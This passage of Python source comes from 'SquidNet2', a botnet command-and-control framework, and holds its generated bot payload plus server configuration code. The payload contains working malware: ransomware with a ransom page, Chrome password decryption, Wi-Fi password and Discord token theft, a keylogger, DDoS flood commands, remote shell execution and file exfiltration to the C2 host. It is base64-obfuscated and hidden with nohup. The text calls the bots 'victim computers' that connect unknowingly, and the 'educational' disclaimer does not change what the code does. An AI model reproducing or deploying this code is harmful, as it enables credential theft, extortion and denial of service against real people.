            <h2>You have successfully put the correct encryption key into the text file({self.keyfile}).</h2>
            <h2>Please wait a moment, as the decrypted files are being decrypted at this moment.
            <h4>You can say your goodbyes to Barbara!</h4>
        </td>
    </tr>
    <tr>
        <td>
            <img src="barbara.png" alt="Where is the image?" width="300" height="500" style="margin-left: auto; margin-right: auto;">
        </td>
    </tr>
</table>
</div>
</body>
        '''
    def ransom_html_code(self):
        return '''
<!DOCTYPE html>
<head>
<style>
    #roundedCorners { 
        border-radius: 25px; 
        border-spacing: 0;
    }
    #roundedCorners td, 
    #roundedCorners th { 
        border-bottom: 1px solid rgb(0, 0, 0);
        padding: 10px; 
    }
    #roundedCorners tr:last-child > td {
        border-bottom: none;
    }
</style>'''+f'''
</head>
<body bgcolor='red'>
    <div style="font-family: sans-serif; text-align: center;">
<title>Oops! | You've been Compromised!</title>
<h1 style="text-align: center;">You have been compromised!</h1>
<table style="margin-left: auto; margin-right: auto; background-color: rgb(255, 80, 67);" id="roundedCorners">
    <tr>
        <td><h1>Oops!</h1></td>
    </tr>
    <tr>
        <td>
            <h2>Looks like your files have been encrypted.</h2>
            <h3>There is hope.</h3>
        </td>
    </tr>
    <tr>
        <td>
            A file has been created in this directory: {self.recovery_directory}{self.keyfile}<br>
            Simply place the encryption key of your files in the file(and this file only), and you will have your files back!<br>
            How you will get your key? Well, that's all up to the BotMaster.
            <h2>Heres a picture of Barbara! Perhaps she will give you emotional Support....</h2><br>
        </td>
    </tr>
    <tr>
        <td>
            <img src="barbara.png" alt="Where is the image?" width="300" height="500" style="margin-left: auto; margin-right: auto;">
        </td>
    </tr>
</table>
</div>
</body>
        '''
    def check_key_file(self):
        while True:
            try:
                file = open(f"{self.recovery_directory}{self.keyfile}","rb")
                content = file.read()
                if bytes(content.strip()) == self.key:
                    self.decryptor = threading.Thread(target=self.decrypt)
                    self.decryptor.start()
                    self.ransom(True)
                    break
                time.sleep(1)
            except:
                pass
    def ransom(self, recovering=False):
        os.chdir(self.recovery_directory)
        if not recovering:
            keyfile = open(self.keyfile,"w")
            keyfile.close()
            self.download_emotional_support()
            filename = "Oops.html"
        else:
            filename = "Yay.html"
            bot.make_selffiles_encrypted_false()
        file = open(f"{self.recovery_directory}{filename}","w")
        if recovering:
            file.write(self.recovering_html_code())
        else:
            file.write(self.ransom_html_code())
        file.close()
        if sys.platform == "win32":
            os.startfile(file.name)
        else:
            os.system(f"open {file.name}")
class Bot:
    def __init__(self, ip, port, enc_key):
        self.ip = ip
        self.port = port
        self.sendingfile = False
        self.enc_key = enc_key
        self.can_encrypt = False
        self.files_encrypted = False
        self.sql_connected = False
        self.keylogging = False
        self.keylogthreadstarted = False
        try:
            self.fernet = Fernet(self.enc_key)
            self.can_encrypt = True
        except:
            pass
        self.writefile = None
        self.writing_mode = False
    def get_ip(self):
        try:
            return urllib.request.urlopen(urllib.request.Request(url="https://httpbin.org/ip")).read().decode().strip().split('"')[3]
        except:
            try:
                return socket.gethostbyname(socket.gethostname())
            except:
                return "127.0.0.1"
    def get_info(self):
        return f"!botreg {socket.gethostname()} {self.get_ip()} {os.getlogin()} {sys.platform}".encode()
    def connect(self):
        while True:
            try:
                self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.client.connect((self.ip, self.port))
                banner = self.client.recv(1024).decode()
                time.sleep(5)
                break
            except:
                self.client.close()
        try:
            self.client.send(self.get_info())
        except:
            pass
        reciever = threading.Thread(target=self.recv).start()
        self.pkt_sender = threading.Thread(target=self.check_still_connected).start()
    def initiate_connection(self):
        connect = threading.Thread(target=self.connect).start()
    def get_filename(self, msg):
        msg = msg.split()
        del msg[0]
        filename = ""
        for i in msg:
            filename += f" {i}"
        return filename.strip()
    def make_selffiles_encrypted_false(self):
        self.files_encrypted = False
    def check_still_connected(self):
        while True:
            try:
                self.client.send("".encode())
                time.sleep(10)
            except:
                while True:
                    try:
                        reconnect = threading.Thread(target=self.connect).start()
                        break
                    except RuntimeError:
                        pass
                break
    def recv(self):
        while True:
            try:
                msg = self.client.recv(10240).decode()
                if not self.sendingfile:
                    while True:
                        try:
                            handle_msg = threading.Thread(target=self.send, args=(msg,)).start()
                            break
                        except RuntimeError:
                            pass
            except Exception as e:
                self.client.close()
                while True:
                    try:
                        reconnect = threading.Thread(target=self.connect).start()
                        break
                    except RuntimeError:
                        pass
                break
    def obtainwifipass(self):
        if sys.platform != "win32":
            return "This bot is on a Apple-based product. Unable to get wifi passwords!"
        else:
            item = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
            prof_names = (re.findall("All User Profile     : (.*)\\r", item))
            passwords = []
            check_networks = []
            for i in prof_names:
                item = subprocess.run(["netsh", "wlan", "show", "profiles", i], capture_output=True).stdout.decode()
                security_key = False
                security_key_present = (re.findall("Security key           : (.*)\\r", item))
                if security_key_present[0] == "Present":
                    check_networks.append(i)
                else:
                    pass
            for i in check_networks:
                item = subprocess.run(["netsh", "wlan", "show", "profiles", i, "key=clear"],
                                      capture_output=True).stdout.decode()
                wifi_pass = (re.findall("Key Content            : (.*)", item))
                wifi_pass = wifi_pass[0]
                info = {'ssid': i, 'key': wifi_pass.strip()}
                passwords.append(info)
            main_msg = ""
            for i in passwords:
                main_msg = main_msg + str(i) + ","
            main_msg = f"Wifi Passwords: {main_msg}"
            return main_msg
    def get_encryption_key(self):
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "Google", "Chrome",
                                        "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    def decrypt_password(self,password, key):
        try:    
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return ""
    def main_password_yoinker(self):
        msgtoserv = ""
        key = self.get_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                               "Google", "Chrome", "User Data", "default", "Login Data")
        filename = "ChromeData.db"
        shutil.copyfile(db_path, filename)
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute(
            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = self.decrypt_password(row[3], key)
            if username or password:
                msgtoserv += f"\\nOrigin Url: {origin_url}\\nAction Url: {action_url}\\nUsername: {username}\\nPassword: {password}\\n"
            else:
                continue
        cursor.close()
        db.close()
        try:
            os.remove(filename)
        except:
            pass
        return msgtoserv
    def exec_sql_cmd(self, sqlfile, cmd):
        sql = sqlite3.connect(sqlfile)
        cursor = sql.cursor()
        cursor.execute(cmd)
        output = str(cursor.fetchall())
        sql.commit()
        cursor.close()
        sql.close()
        return output
    def on_press(self, key):
        if self.keylogging:
            self.client.send(f"!key {key}".encode())
    def on_release(self, key):
        pass
    def start_keylog(self):
        try:
            with Listener(on_press=self.on_press, on_release=self.on_release) as L:
                L.join()
        except:
            pass
    def return_actual_dir(self, direc):
        return direc.replace("%user%",os.getlogin())
    def send(self, msg):
        msg = str(msg)
        if not self.writing_mode and not self.sql_connected:
            try:
                if msg.startswith("!open"):
                    filename = self.get_filename(msg)
                    if sys.platform == "win32":
                        os.startfile(filename)
                    else:
                        os.system(f"open {filename}")
                elif msg.startswith("!keylog"):
                    if not self.keylogging:
                        if not self.keylogthreadstarted:
                            keylogger = threading.Thread(target=self.start_keylog)
                            keylogger.start()
                        self.keylogging = True
                        self.keylogthreadstarted = True
                elif msg.startswith("!stopkeylog"):
                    self.keylogging = False
                elif msg.startswith('!httpflood'):
                    msg = msg.split()
                    ip = msg[1]
                    delay = float(msg[2])
                    self.dos = DDoS(ip, delay)
                elif msg.startswith("!sqlconnect"):
                    try:
                        self.sql_connected = True
                        self.sql_file = self.get_filename(msg)
                        file = open(self.sql_file,"rb")
                        file.close()
                        item = self.exec_sql_cmd(self.sql_file, "select sql from sqlite_master")
                        self.client.send(f"Successfully connected to the Database file: {self.sql_file}".encode())
                    except Exception as e:
                        self.client.send(f"There was an error connecting to file '{self.sql_file}': {e}".encode())
                        self.sql_connected = False
                elif msg.startswith("!stopatk"):
                    try:
                        self.dos.stop_atk()
                    except:
                        pass
                    try:
                        self.tcpflood.Stop_Atk()
                    except:
                        pass
                    try:
                        self.udpflood.Stop_Atk()
                    except:
                        pass
                elif msg.startswith("!tcpflood"):
                    msg_split = msg.split()
                    ip = msg_split[1]
                    try:
                        port = int(msg_split[2])
                    except:
                        port = 80
                    try:
                        delay = float(msg_split[3])
                    except:
                        delay = 0
                    try:
                        pkt_size = int(msg_split[4])
                    except:
                        pkt_size = 1024
                    try:
                        thr_count = int(msg.split()[5])
                    except:
                        thr_count = 2000
                    self.tcpflood = TCP_UDP_Flood(ip, port, delay, pkt_size, thr_count)
                    self.tcp_flood = threading.Thread(target=self.tcpflood.TCP_Flood)
                    self.tcp_flood.start()
                elif msg.startswith("!udpflood"):
                    msg_split = msg.split()
                    ip = msg_split[1]
                    try:
                        port = int(msg_split[2])
                    except:
                        port = 80
                    try:
                        delay = float(msg_split[3])
                    except:
                        delay = 0
                    try:
                        pkt_size = int(msg_split[4])
                    except:
                        pkt_size = 1024
                    try:
                        thr_count = int(msg.split()[5])
                    except:
                        thr_count = 2000
                    self.udpflood = TCP_UDP_Flood(ip, port, delay, pkt_size, thr_count)
                    self.udp_flood = threading.Thread(target=self.udpflood.UDP_Flood)
                    self.udp_flood.start()
                elif msg.startswith("!renamefile"):
                    og_name = msg.split()[1]
                    new_name= msg.split()[1]
                    os.rename(og_name,new_name)
                elif msg.startswith("!getcwd"):
                    cwd = os.getcwd()
                    self.client.send(f"Current working directory: {os.getcwd()}".encode())
                elif msg.startswith("!changedir"):
                    newdir = self.return_actual_dir(self.get_filename(msg))
                    os.chdir(newdir)
                elif msg.startswith("!viewfilecontent"):
                    file = msg.split()[1]
                    self.client.send(open(file, "rb").read())
                elif msg.startswith("!listdir"):
                    self.client.send(f"Files in dir {os.getcwd()}: {os.listdir()}".encode())
                elif msg.startswith("!mkdir"):
                    dir = self.get_filename(msg)
                    os.mkdir(dir)
                elif msg.startswith("!ransomware"):
                    if not self.files_encrypted:
                        self.ransomware = RansomWare(self.enc_key)
                        self.ransomware.encrypt()
                        self.files_encrypted = True
                elif msg.startswith("!createfile"):
                    file = self.get_filename(msg)
                    if file in os.listdir():
                        file += f"{random.randint(0,123456789)}"
                    fileopened = open(file, "w")
                    fileopened.close()
                elif msg.startswith("!delfile"):
                    file = self.get_filename(msg)
                    os.remove(file)
                    self.client.send(f"File {file} has been deleted.".encode())
                elif msg.startswith("!delfolder"):
                    folder = self.get_filename(msg)
                    shutil.rmtree(folder)
                    self.client.send(f"Folder {folder} has been deleted.".encode())
                elif msg.startswith("!writefile"):
                    file = self.get_filename(msg)
                    self.writefile = open(file, "rb")
                    content = self.writefile.read()
                    self.writefile.close()
                    self.writefile = self.writefile.name
                    self.writing_mode = True
                elif msg.startswith("!encfile"):
                    if self.can_encrypt:
                        file = self.get_filename(msg)
                        fileopened = open(file,"rb")
                        content = self.fernet.encrypt(fileopened.read())
                        fileopened.close()
                        fileopened = open(file, "wb")
                        fileopened.write(content)
                        fileopened.close()
                        self.client.send(f"File {file} has been encrypted.".encode())
                    else:
                        self.client.send("Cannot encrypt files due to cryptography not being installed.".encode())
                elif msg.startswith("!decrypt"):
                    if self.can_encrypt:
                        file = self.get_filename(msg)
                        fileopened = open(file,"rb")
                        try:
                            content = self.fernet.decrypt(fileopened.read())
                            fileopened.close()
                            fileopened = open(file, "wb")
                            fileopened.write(content)
                            fileopened.close()
                            self.client.send(f"File {file} has been decrypted.".encode())
                        except Exception as e:
                            self.client.send(f"There was en error with decrypting file {file}.".encode())
                    else:
                        self.client.send("Cannot decrypt files due to cryptography not being installed.".encode())
                elif msg.startswith("!getdiscordtoken"):
                    grabber = TokenGrab()
                    tokens = grabber.main()
                    self.client.send(str("Tokens: "+str(tokens)).encode())
                elif msg.startswith("!getwifipass"):
                    self.client.send(self.obtainwifipass().encode())
                elif msg.startswith("!getpasswords"):
                    if sys.platform == "win32":
                        passwords = self.main_password_yoinker()
                        self.client.send(passwords.encode())
                    else:
                        self.client.send("Client not on Windows machine.".encode())
                elif msg.startswith("!filedownload"):
                    try:
                        file = self.get_filename(msg)
                        file = open(file, "rb")
                        length = len(open(file.name,"rb").read())
                        self.client.send(f"!filesize {length}".encode())
                        self.sendingfile = True
                        while True:
                            sendto = file.read(10240)
                            if not sendto:
                                self.sendingfile = False
                                break
                            else:
                                self.client.send(sendto)
                        time.sleep(1)
                        self.client.send("File transfer to server completed.".encode())
                    except:
                        length = 0
                        self.client.send(f"!filesize {length}".encode())
                        time.sleep(1)
                        self.client.send("File was not found in the bot directory.".encode())
                elif msg.startswith("!download"):
                    try:
                        link = msg.split()[1]
                        file = msg.split()[2]
                        cmd = subprocess.Popen(f"curl -o {file} {link}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        self.client.send(f"File {file} has been downloaded from {link}.".encode())
                    except:
                        self.client.send(f"There was an error with downloading the file.".encode())
                else:
                    cmd = subprocess.Popen(msg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    self.client.send(cmd.stdout.read())
                    self.client.send(cmd.stderr.read())
            except Exception as e:
                pass
        elif self.writing_mode:
            write_msg = f"\\n{msg}".encode()
            if msg == "!stopwrite":
                self.writing_mode = False
            else:
                file = open(self.writefile, "rb")
                content = file.read()
                file.close()
                file = open(self.writefile,"wb")
                file.write(content)
                file.write(write_msg)
        elif self.sql_connected:
            if msg.startswith("!stopsql"):
                self.sql_connected = False
                self.client.send("Disconnecting from the Sqlite3 Database file.".encode())
            else:
                try:
                    output = self.exec_sql_cmd(self.sql_file, msg)
                    self.client.send(output.encode())
                except Exception as e:
                    self.client.send(f"There was an error in the Database file: {e}".encode())
args = sys.argv
fileargs = sys.argv[0].split("/")[len(sys.argv[0].split("/"))-1]
if ".py" in fileargs:
    fileargs = f'python3 {fileargs}'
else:
    fileargs = args[0]
if "-u" in args or sys.platform == 'win32':
    bot = Bot('"""+self.external_ip+"""',"""+str(self.external_port)+""", """+str(self.enc_key)+""")
    bot.initiate_connection()
else:
    os.system(f"nohup {fileargs} > /dev/null -u &")
"""+self._inject
        _payload = f"exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('{base64.b64encode(payload.encode()).decode()}')[0]))"
        return _payload, payload
class AutoUpdate:
    """
    # Automatic Updating

    This class was created for automatically updating the SquidNet2 Framework to the latest version.
    It makes a request to the github repository 'SquidNet2Version.json' json file, and checks what
    the latest version of the server is, according to what the file says. If the version on this 
    script(referred to via the `self.version` variable) is less than the version on the json file,
    the user will be prompted to update. If the user says yes to updating, the contents of this
    script will be completely wiped, and replaced with the new one.
    """
    def __init__(self):
        self.version = 5.0
    def check_update(self):
        """Sends the request to the github repository, and checks to see if the script needs and update."""
        print(SquidNet.logo.fget())
        print("[+] Checking for updates.....")
        version = self.version - 1.0
        updated = False
        try:
            req = urllib.request.Request(url="https://raw.githubusercontent.com/DrSquidX/SquidNet2/main/SquidNet2Version.json")
            recv = urllib.request.urlopen(req).read().decode()
            version_info = open("SquidNet2Version.json","w")
            version_info.write(recv)
            version_info.close()
            json_info = json.load(open(version_info.name,"r"))
            version = float(json_info[0]["SquidNet2"])
        except:
            print("[+] There was an error with checking updates, starting SquidNet2.")
        if version > self.version:
            print(f"[+] Your Version of SquidNet2 is outdated. You have version {self.version}, whereas the current update is version v{version}.")
            if sys.argv[0].endswith(".py"):
                update = input("\n[+] Do you wish to update?(y/n): ").lower()
                if update == "y" or update == "yes":
                    print(f"[+] Updating SquidNet2 to v{version}")
                    updated = True
                    req = urllib.request.Request(url="https://raw.githubusercontent.com/DrSquidX/SquidNet2/main/MainScripts/SquidNet2.py")
                    resp = urllib.request.urlopen(req).read()
                    file = open(sys.argv[0],"wb")
                    file.write(resp)
                    file.close()
                else:
                    print("[+] Choosing not to update.")
            else:
                updated = False
                print("[+] Not updating due to the file not being a '.py'.\n[+] Starting SquidNet2 in 3 seconds.....")
                time.sleep(3)
        if not updated:
            if sys.platform == "win32":
                os.system("cls")
            else:
                os.system("clear")
            Squidnet = Config(self.version)
        else:
            print("[+] Restart the Script to have the Update be effective!")
class Config:
    """
    # Configuration

    This class is needed for configuring the settings that allow the server to function properly.
    There are 2 choices of configuration: Option-Parsing and the usage of a Config file."""
    def __init__(self, version):
        self.version = version
        self.config_file = "server.config"
        self.filearg = sys.argv[0].split("/")[len(sys.argv[0].split("/"))-1]
        if ".py" in self.filearg:
            self.filearg = f"python3 {self.filearg}"
        self.parse_args()
    def information(self):
        print(f"""[+] SquidNet2: The Sequel to SquidNet that nobody asked for, but everyone needed.
[+] Written in Python 3.8.3

[+] Why SquidNet2?
    SquidNet2 offers all of the features(except for SSH, just use SquidNetSSH) that the original had,
    but better. One prime example is the significantly improved web interface, with many others like
    more security and more stability. There are more functions that were built on top of the original
    and there are more possibilities with SquidNet2 that are achievable compared to SquidNet.

[+] The SquidNet2 Framework:
    SquidNet2 - Server:
        This script is the server part of the SquidNet2 framework. It is the foundation and handler of
        all the bots and admin connections. It acts as a command and control server, where the bots connect
        to this server, and the admin also has to as well, to then execute commands on this server. This
        is so that the admins can communicate and connect to the server wherever and whenever they want,
        as long as the Server itself is up.
    SquidNet2 - Admin:
        While this acts as the handler to ensure control of remote computers, there still needs to be an admin
        that is able to remotely execute commands on the bot computers. This is where the admin comes into
        play. The admin connects to the server, and logs into the admin account that has been configured
        when the server had started. Once authentication is complete, the admin will have access to the server
        and all of the bots that are connected to it.
    SquidNet2 - Bots:
        The bots are the victim computers that will unknowingly connect to the SquidNet2 server. There is a
        payload that is automatically generated by the server that can then be run by victim computers and
        connect to that server specifically. There are numerous commands that are built into the payload,
        which the admin of the server can run them to extract information or run commands remotely on those
        computers. These bots can also run shell commands, if there are not any commands being sent that are
        part of the in-built commands that the payload provides.

[+] Usefulness and function of SquidNet2:
    - Remotely accessing lost computers
    - Taking control of other people's computers(illegal without consent)
    - Penetration Testing
    - Impressive
    - Lots of options for overall better experience

[+] Risks:
    - Being careless and taking control of computers, which is illegal.
    - Server might not be up to security standards(need to improve authentication)

[+] Topology of the SquidNet2 Framework:
             _________  
             |       |   - Admin
             | Admin |     Sends commands to the server.
             |_______|     The admin also recieves messages
                           from the server with information         
                 ^         regarding command output, or other
                 |         important info on the server's 
                 |         status.
                 V 
            ____________
            |          |   - Server
            |  Server  |     Recieves the Admin's instruction
            |          |     and sends it to the bots
            |__________|     It also recieves bot output and sends
          ^      ^       ^   it to the admin.
         /       |        \\
        /        |         \\
       V         V          V
   _________  _________  _________  - Bots
   |       |  |       |  |       |    Recieves the command via the server,
   |  Bot  |  |  Bot  |  |  Bot  |    executes it and sends any output back.
   |_______|  |_______|  |_______|    They are being remotely controlled.
[+] Key:
    <-->(arrows) - Indicate direction of messages and packets
    '-'          - Notations

[+] Features:
    Web Interface:
        A web interface that cleanly shows information about the bots in
        nice tables, with the additional ability to also be able to run
        commands via the web interface to the bots and more. There is 
        information displayed that shows the settings and configuration of
        the server, giving the user information that shows what the server 
        is using to function.
    Options for Server configuration:
        There is the ability to use the option-parsing that most scripts
        use, or to use a configuration file that allows for quick and
        easy configuration, and allows the server to be started quicker
        without needing to constantly type the same credentials over and
        over again.
    Numerous Commands:
        {SquidNet.help_msg.fget(None).replace("[+]","       ").replace("[(SERVER)]: Info about each command:","   ").replace("!","    !").strip()}
        
[+] For your information:
    Read the github README.md file for more information on the SquidNet2 framework.
    This script was made for educational purposes only. Any illegal use of this
    script not caused by the developer is not responsible for any damages done.
    This script follows this license(MIT):
    ''' MIT License
        
        Copyright (c) 2022 DrSquidX

        Permission is hereby granted, free of charge, to any person obtaining a copy
        of this software and associated documentation files (the "Software"), to deal
        in the Software without restriction, including without limitation the rights
        to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
        copies of the Software, and to permit persons to whom the Software is
        furnished to do so, subject to the following conditions:

        The above copyright notice and this permission notice shall be included in all
        copies or substantial portions of the Software.

        THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
        IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
        FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
        AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
        LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
        OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
        SOFTWARE.
    '''
    Thank you for agreeing with these terms.

[+] Overall:
    SquidNet2 is the far superior version of SquidNet, with many features that were
    reused and improved onto, as well as many new features being added to increase the
    stability and function of the framework.

[+] Happy (Ethical) Hacking! - DrSquid
""")
        sys.exit()
    def help_msg(self):
        print(f"""
Usage: {self.filearg} [options..]

Options:
  -h, --help            Show this help message and exit.
  --ip, --ipaddr        The IP Address that the server will bind to.(required)
  --p, --port           The port that will bind to the IP address.(default:
                        8080)
  --eip, --externalip   The external IP that Bots will connect to.(default:
                        opt.ip)
  --ep, --externalport  The external Port that Bots will connect to.(default:
                        opt.p)
  --ek, --enckey        The encryption key used on the bots for file
                        encryption.(default:
                        b'iC0g4NM4xy5JrIbRV-8cZSVgFfQioUX8eTVGYRhWlF8=')
  --l, --logfile        The file used for server logging.(default: log.txt)
  --au, --adminuser     The username for the admin account.(default: admin)
  --ap, --adminpass     The password for the admin account.(default:
                        adminpassword12345)
  --fd, --ftpdir        The main directory for File Transferring.(default:
                        Bot_Files)
  --if, --injectfile    A custom injection file that you might want to 
                        include with the SquidNet payload(default: None)    
  --r, --ransomware     Whether the ransomware payload on the bots can be
                        used(default: False)
  --c, --config         Whether to use a config file for server
                        configuration.(default: False)
  --i, --info           Information about the SquidNet2 
                        Framework.(default: False)
  --pn, --patchnotes    Shows information on the latest patch on
                        SquidNet2.(default: False)
Examples: 
  {self.filearg} --ip localhost --p 8080 --eip 1.2.3.4 --ep 80 --r
  {self.filearg} --c
        """)
        sys.exit()
    def patch_notes(self):
        print(f"""
[+] Whats new in SquidNet2 v{self.version}:
    - Many bug fixes
    - Numerous typos fixed
    - Changed password hashing algorithm(sha256->SquidHash)
    - Added Web interface for server-side script(binds to 'localhost:8000')
    - Made payload more hidden('nohup' command execution for OSX and Linux)
    - Added base64 encoded payload
    - Added Option-parsing
    - Added information message('--i')
    - Changed 'self.listen()' function(old one will be deleted soon)
    - Finally implemented properties
    - Added '!getpasswords, !getdiscordtoken, !getwifipasswords' commands
    - Readded older features from the original SquidNet(old commands, web interface, etc.)
    - Added developer notes in the source code
    - Made things a little more professional looking

[+] Read the github README or read the developer notes for more information.
        """)
        sys.exit()
    def parse_args(self):
        global SquidNet
        """
        # Option Parsing

        This is the main function for option parsing.
        """
        args = OptionParser(add_help_option=False)
        args.add_option('-h','--help', dest="h",action="store_true",help='Show this help message and exit.')
        args.add_option("--ip","--ipaddr",dest="ip",help="The IP Address that the server will bind to.(required)")
        args.add_option("--p","--port",dest="p",help="The port that will bind to the IP address.(default: 8080)")
        args.add_option("--eip","--externalip",dest="eip",help="The external IP that Bots will connect to.(default: opt.ip)")
        args.add_option("--ep","--externalport",dest="ep",help="The external Port that Bots will connect to.(default: opt.p)")
        args.add_option("--ek","--enckey",dest="ek",help="The encryption key used on the bots for file encryption.(default: b'iC0g4NM4xy5JrIbRV-8cZSVgFfQioUX8eTVGYRhWlF8=')")
        args.add_option("--l","--logfile",dest="l",help="The file used for server logging.(default: log.txt)")
        args.add_option("--au","--adminuser",dest="au",help="The username for the admin account.(default: admin)")
        args.add_option("--ap","--adminpass",dest="ap",help="The password for the admin account.(default: adminpassword12345)")
        args.add_option("--fd","--ftpdir",dest="fd",help="The main directory for File Transferring.(default: Bot_Files)")
        args.add_option("--r","--ransomware",dest="r",action="store_true",help="Whether the ransomware payload on the bots can be used(default: False)")
        args.add_option("--c","--config",dest="c",action="store_true",help="Whether to use a config file for server configuration.(default: False)")
        args.add_option("--i","--info",dest="i",action="store_true",help="Information about the SquidNet2 Framework.(default: False)")
        args.add_option("--if","--injectfile",dest="inf",help="A custom injection python file that you might want to include with the SquidNet payload(default: None)")
        args.add_option("--pn","--patchnotes",action="store_true",dest="pn",help="Shows information on the latest patch on SquidNet2(default: False)")
        opt, arg = args.parse_args()
        print(SquidNet.logo.fget())
        missing_args = False
        usingconf = False
        if opt.h is not None:
            self.help_msg()
        if opt.c is not None:
            self.read_config()
            usingconf = True
        if opt.i is not None:
            self.information()
        if opt.pn is not None:
            self.patch_notes()
        if not usingconf:
            if opt.ip is None:
                ip = None
                missing_args = True
            else:
                ip = opt.ip
            if opt.p is None:
                p = 8080
            else:
                p = int(opt.p)
            if opt.eip is None:
                eip = ip
            else:
                eip = opt.eip
            if opt.ep is None:
                ep = p
            else:
                ep = int(opt.ep)
            if opt.ek is None:
                ek = b'iC0g4NM4xy5JrIbRV-8cZSVgFfQioUX8eTVGYRhWlF8='
            else:
                ek = str(opt.ek).encode()
            if opt.l is None:
                l = "log.txt"
            else:
                l = opt.l
            if opt.au is None:
                au = "admin"
            else:
                au = opt.au
            if opt.ap is None:
                ap = "adminpassword12345"
            else:
                ap = opt.ap
            if opt.fd is None:
                fd = "Bot_Files"
            else:
                fd = opt.fd
            if opt.r is not None:
                r = True
            else:
                r = False
            if opt.inf is not None:
                inf = opt.inf
            else:
                inf = None
            if missing_args:
                self.help_msg()
            else:
                if sys.platform == "win32":
                    os.system("cls")
                else:
                    os.system("clear")
                Squidnet = SquidNet(ip, p, self.version, eip, ep, au, ap, l, ek, fd, r, inf)
                Squidnet.start()
    def read_config(self):
        """The config file is read here, where the variables that are in the file are used for the main server."""
        try:
            file = open(self.config_file,"r")
            content = file.readlines()
            for i in content:
                if i.startswith("\nhostip") or i.startswith("hostip"):
                    hostip = i.replace("=","").split()[1]
                elif i.startswith("\nhostport") or i.startswith("hostport"):
                    hostport = int(i.replace("=","").split()[1])
                elif i.startswith("\nexternal_host") or i.startswith("external_host"):
                    external_host = i.replace("=","").split()[1]
                elif i.startswith("\nexternal_port") or i.startswith("external_port"):
                    external_port = int(i.replace("=","").split()[1])
                elif i.startswith("\nlogfile") or i.startswith("logfile"):
                    logfile = i.replace("=","").split()[1]
                elif i.startswith("\nadmin_name") or i.startswith("admin_name"):
                    admin_name = i.replace("=","").split()[1]
                elif i.startswith("\nadmin_password") or i.startswith("admin_password"):
                    admin_password = i.replace("=","").split()[1]
                elif i.startswith("\nenc_key") or i.startswith("enc_key"):
                    enc_key = f"{i.replace('=','').split()[1]}=".encode()
                elif i.startswith("\nftp_dir") or i.startswith("ftp_dir"):
                    ftp_dir = i.replace("=","").split()[1]
                elif i.startswith("\nransomware_active") or i.startswith("ransomware_active"):
                    ransomware_active = i.replace("=","").split()[1]
                    if ransomware_active.lower() == "f":
                        ransomware_active = False
                    else:
                        ransomware_active = True
                elif i.startswith("\ninjectfile") or i.startswith("injectfile"):
                    injectfile = i.replace("=","").split()[1]
                    if injectfile == "None":
                        injectfile = None
            Squidnet = SquidNet(hostip, hostport, self.version, external_host, external_port, admin_name, admin_password, logfile, enc_key, ftp_dir, ransomware_active, injectfile)
            Squidnet.start()
        except Exception as e:
            self.gen_config_file()
    def gen_config_file(self):
        """If there is an error in the usage of the config file, a new config file will be generated, and the user can simply 
        restart the script to have a functional server."""
        print(SquidNet.logo.fget())
        print("[+] There is an error in the config file. Re-writing and re-formatting to be able to be used by the server.")
        gen_content = """
hostip = localhost
hostport = 8080
external_host = localhost
external_port = 8080
logfile = log.txt
admin_name = admin
admin_password = adminpassword12345
enc_key = iC0g4NM4xy5JrIbRV-8cZSVgFfQioUX8eTVGYRhWlF8=
ftp_dir = Bot_Files
ransomware_active = f
injectfile = None
"""
        file = open(self.config_file,"w")
        file.write(gen_content)
        file.close()
        print("[+] The Config file has been reformatted and is now usable by the server! Restart the script to start the server.")
        
if __name__ == "__main__":
    SquidNet2 = AutoUpdate()
    SquidNet2.check_update()
